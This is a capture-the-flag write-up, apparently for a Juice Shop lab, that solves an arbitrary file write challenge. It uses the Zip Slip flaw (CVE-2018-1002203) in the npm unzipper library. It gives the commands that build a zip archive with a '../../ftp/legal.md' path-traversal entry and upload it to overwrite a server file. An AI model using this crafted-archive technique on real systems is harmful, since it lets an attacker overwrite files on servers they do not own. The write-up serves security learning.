# File Write Challenge
## 6-star Arbitrary File Upload Challenge

This challenge has a code snippet from the server-side as a hint. Looking at it closer, we can see that the vulnerable lines are 12 and 17, pointing towards the npm unzipper library which is used to unzip archive files (i.e. 7z, zip, rar, etc).

Searching snyk (https://snyk.io/) for a vulnerability with the unzipper library, we can find _CVE-2018-1002203_. This vulnerability is also known as the Zip Slip vulnerability, which makes use of the unzipper library to traverse the directory of the server and write the file.

In this challenge, we are required to overwrite the legal document file in _http://localhost:3000/ftp/legal.md_. This can be done by hand-crafting a zip archive that contains a directory traversal folder as a stored item. The unzipper will unzip the item and traverse the directory to overwrite legal.md.

Create a txt file to craft the zip archive

        echo "" > wow.txt
        zip -r danzelzipslip.zip wow.txt
Make a new folder in local directory to contain the exploit file _legal.md_

        sudo mkdir ../../ftp
        sudo echo "danzel was here" > ../../ftp/legal.md
        
Zip this file together with the original one

        sudo zip danzelzipslip.zip ../../ftp/legal.md
        
If we view this archive, we can see the directory traversal legal.md file

    ┌──(kali㉿kali)-[~/Desktop]
    └─$ jar -tvf danzelzipslip.zip 
    23 Mon Jul 12 10:01:56 EDT 2021 wow.txt
    23 Mon Jul 12 10:04:44 EDT 2021 ../../ftp/legal.md

Send the .zip file through the complaints page and the exploit will overwrite the legal.md file stored on the server, solving the challenge.

        You successfully solved a challenge: Arbitrary File Write (Overwrite the Legal Information file.)
